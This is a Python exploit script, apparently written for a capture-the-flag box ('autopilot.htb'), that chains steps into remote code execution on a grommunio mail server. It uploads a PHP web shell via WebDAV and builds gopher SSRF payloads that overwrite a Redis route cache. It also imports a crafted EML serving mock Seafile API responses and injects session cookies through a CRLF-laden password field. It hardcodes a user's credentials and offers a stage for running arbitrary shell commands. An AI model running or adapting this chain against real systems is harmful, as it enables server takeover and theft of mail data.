#!/usr/bin/env python3
"""
Autopilot foothold: WebDAV upload -> EML-imported mock Seafile API ->
Redis SETEX route cache overwrite (via gopher SSRF) -> PHP route execution.

Run stages in order:
  python3 autopilot_foothold.py upload      # PUT rclprobe.txt via WebDAV
  python3 autopilot_foothold.py route       # build Redis gopher URLs -> route_urls.json
  python3 autopilot_foothold.py run         # login, create seafile acct, import EML, trigger
  python3 autopilot_foothold.py rce 'id'    # fire a command through the (still-active) route
"""
import base64
import json
import os
import secrets
import struct
import sys
import time
from email.message import EmailMessage
from email.policy import SMTP
from pathlib import Path
from urllib.parse import quote_from_bytes

import requests
import urllib3
urllib3.disable_warnings()

TARGET_IP = os.environ.get('TARGET_IP', '10.129.34.120')
HOST = 'mail.autopilot.htb'
BASE = f'https://{HOST}/'
USER = 'deborah.hernandez'
PASS = '8F5cgp@tC8g@'
PAYLOAD_REMOTE_NAME = 'rclprobe.txt'
PAYLOAD_PATH = f'/var/lib/grommunio-files/data/{USER}/files/{PAYLOAD_REMOTE_NAME}'
ROUTE_URLS_FILE = Path('route_urls.json')
SESSION_FILE = Path('session_cookies.json')

PHP_PAYLOAD = (b'<?php header("Content-Type: text/plain"); '
               b'$c=$_GET["cmd"]??"id"; @passthru($c." 2>&1"); ?>')

# ---------- stage: upload ----------
def stage_upload():
    url = (f'https://{TARGET_IP}/files/remote.php/dav/files/{USER}/{PAYLOAD_REMOTE_NAME}')
    r = requests.put(
        url, data=PHP_PAYLOAD, auth=(USER, PASS),
        headers={'Host': HOST}, verify=False, timeout=25,
    )
    print('upload status', r.status_code)

# ---------- stage: route (Redis gopher payload builder) ----------
def resp(*values):
    out = bytearray(f'*{len(values)}\r\n'.encode())
    for value in values:
        item = str(value).encode()
        out.extend(f'${len(item)}\r\n'.encode())
        out.extend(item + b'\r\n')
    return bytes(out)

def gopher(*commands):
    data = b''.join(resp(*c) for c in commands)
    return 'gopher://127.0.0.1:6379/_' + quote_from_bytes(data, safe='')

def stage_route():
    prefix = os.environ.get('FILES_CACHE_PREFIX', '0080d9f8020c1c045f3ae6468d0c933a')
    key = f'{prefix}/routemail.autopilot.htb#/files/index.php#rootCollection'
    route = [
        False,
        {'/ctf': [[
            {'_route': 'ctf', 'file': PAYLOAD_PATH},
            None, {'GET': 0}, None, False, False, None,
        ]]},
        [], {}, None,
    ]
    route_json = json.dumps(route, separators=(',', ':'))
    exec_url = gopher(('SETEX', key, 20, route_json), ('QUIT',))
    del_url = gopher(('DEL', key), ('QUIT',))
    ROUTE_URLS_FILE.write_text(json.dumps({'exec': exec_url, 'del': del_url}))
    print('wrote', ROUTE_URLS_FILE)
    print('exec_url:', exec_url[:80], '...')

# ---------- stage: run (login, bootstrap seafile acct, import EML, trigger) ----------
def stage_run():
    session = requests.Session()
    session.verify = False
    r = session.post(BASE + 'web/?logon', data={'username': USER, 'password': PASS},
                      headers={'Host': HOST}, timeout=30)
    r.raise_for_status()
    print('login status', r.status_code)

    # --- create draft with 3 mock attachments (ping/repos/file placeholder) ---
    dialog = 'mockattach' + secrets.token_hex(11)
    repo_id = '11111111-1111-1111-1111-111111111111'
    files = [
        ('attachments[]', ('ping.json', b'"pong"', 'application/json')),
        ('attachments[]', ('repos.json', json.dumps([
            {'type': 'repo', 'name': 'mock', 'id': repo_id, 'mtime': 0}
        ]).encode(), 'application/json')),
        ('attachments[]', ('file.json',
            json.dumps('http://127.0.0.1/statusmonitor').encode(), 'application/json')),
    ]
    upload = session.post(
        BASE + 'web/index.php?load=upload_attachment'
               + '&dialog_attachments=' + dialog
               + '&module=createmailitemmodule&moduleid=1',
        data={'dialog_attachments': dialog, 'ignore_extract_attachid': 'true'},
        files=files, headers={'Host': HOST}, timeout=40,
    ).json()
    uploaded = upload['grommunio']['createmailitemmodule']['1']['update']['item']
    locations = [
        'mock/api2/ping/', 'mock/api2/repos/',
        f'mock/api2/repos/{repo_id}/file/?p=/foo',
    ]
    attachments = [
        {'inline': True, 'tmpname': item['props']['tmpname'], 'cid': loc}
        for item, loc in zip(uploaded, locations)
    ]
    save_body = {'grommunio': {'createmailitemmodule': {'1': {'save': {
        'props': {'message_class': 'IPM.Note', 'subject': 'Seafile mock ' + dialog},
        'attachments': {'dialog_attachments': dialog, 'add': attachments},
    }}}}}
    saved = session.post(
        BASE + 'web/grommunio.php?subsystem=webapp_' + str(int(time.time() * 1000)),
        json=save_body, headers={'Host': HOST}, timeout=40,
    ).json()
    draft_state = {'save': saved}
    print('draft created')

    # --- build real EML with route_exec / route_del gopher URLs ---
    if not ROUTE_URLS_FILE.exists():
        print('ERROR: run `route` stage first to produce route_urls.json')
        sys.exit(1)
    urls = json.loads(ROUTE_URLS_FILE.read_text())
    exec_url, del_url = urls['exec'], urls['del']

    message = EmailMessage(policy=SMTP.clone(max_line_length=998))
    message['From'] = message['To'] = f'{USER}@autopilot.htb'
    message['Subject'] = 'Draft route script'
    message.set_content('Draft route script.')
    responses = [
        ('mock/api2/ping/', json.dumps('pong')),
        ('mock/api2/repos/', json.dumps([
            {'type': 'repo', 'name': 'mock', 'id': repo_id, 'mtime': 0}
        ])),
        (f'mock/api2/repos/{repo_id}/file/?p=/route_exec', json.dumps(exec_url)),
        (f'mock/api2/repos/{repo_id}/file/?p=/route_del', json.dumps(del_url)),
    ]
    for location, body in responses:
        message.add_attachment(body.encode(), maintype='application',
                                subtype='json', filename='data.json')
        message.get_payload()[-1]['Content-Location'] = location

    item = draft_state['save']['grommunio']['createmailitemmodule']['1']['update']['item']
    store = item['store_entryid']
    draft_folder = item['parent_entryid']
    dialog2 = 'mockattach' + secrets.token_hex(12)
    params = {
        'load': 'upload_attachment', 'module': 'createmailitemmodule',
        'moduleid': '1', 'dialog_attachments': dialog2,
        'store': store, 'destination_folder': draft_folder,
        'import': '1', 'ignore_extract_attachid': 'true',
    }
    import_reply = session.post(
        BASE + 'web/index.php', params=params, data=params,
        files=[('attachments[]', ('probe.eml', message.as_bytes(), 'message/rfc822'))],
        headers={'Host': HOST}, timeout=40,
    ).json()
    entry_id = import_reply['grommunio']['createmailitemmodule']['1']['import']['items']
    cookie = '; '.join(k + '=' + v for k, v in session.cookies.items())
    print('imported EML, entry_id =', entry_id)

    config = {
        'server_address': HOST, 'server_port': '443', 'server_ssl': '1',
        'server_path': ('web/index.php?load=download_attachment&store='
                         + store + '&entryid=' + entry_id + '&attachCid=mock'),
        'user': '@auth:token:deborah',
        'password': ('x\r\nCookie: ' + cookie + '\r\nUser-Agent: '
                      + session.headers.get('User-Agent', 'python-requests')),
        'use_grommunio_credentials': '0',
    }

    def webapp(payload):
        return session.post(
            BASE + 'web/grommunio.php?subsystem=webapp_' + str(int(time.time() * 1000)),
            json={'grommunio': payload}, headers={'Host': HOST}, timeout=45,
        )

    preliminary = dict(config)
    preliminary['password'] = 'x\r\nCookie: ' + cookie
    created = webapp({'filesaccountmodule': {'1': {'save': {'props': {
        'name': 'mock-seafile-relay',
        'backend': 'Seafile',
        'backend_config': preliminary,
    }}}}}).json()
    print('account create reply:', json.dumps(created)[:300])
    account_id = created['grommunio']['filesaccountmodule']['1']['update']['item'][0]['entryid']

    update_reply = webapp({'filesaccountmodule': {'1': {'save': {
        'entryid': account_id, 'props': {'backend_config': config}
    }}}})
    print('account update (full cookie) reply:', json.dumps(update_reply.json())[:500])

    def trigger(name):
        r = webapp({'filesbrowsermodule': {'1': {'downloadtotmp': {
            'ids': ['#R#' + account_id + '/mock/' + name],
            'dialog_attachments': 'test' + secrets.token_hex(14),
        }}}})
        print(f'trigger({name}) reply:', json.dumps(r.json())[:500])
        return r

    trigger('route_exec')
    time.sleep(1)
    out = session.get(BASE + 'files/index.php/ctf', params={'cmd': 'id'},
                       headers={'Host': HOST}, timeout=15)
    print('RCE TEST OUTPUT:', out.text[:300])
    trigger('route_del')

    # persist session + account id for later rce() calls
    SESSION_FILE.write_text(json.dumps({
        'cookies': session.cookies.get_dict(),
        'account_id': account_id,
        'store': store, 'entry_id': entry_id,
    }))

# ---------- stage: rce (fire a single command through the currently-active route) ----------
def stage_rce(cmd):
    r = requests.get(
        f'https://{TARGET_IP}/files/index.php/ctf',
        params={'cmd': cmd}, headers={'Host': HOST}, verify=False, timeout=15,
    )
    print(r.text)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    stage = sys.argv[1]
    if stage == 'upload':
        stage_upload()
    elif stage == 'route':
        stage_route()
    elif stage == 'run':
        stage_run()
    elif stage == 'rce':
        stage_rce(sys.argv[2] if len(sys.argv) > 2 else 'id')
    else:
        print('unknown stage', stage)
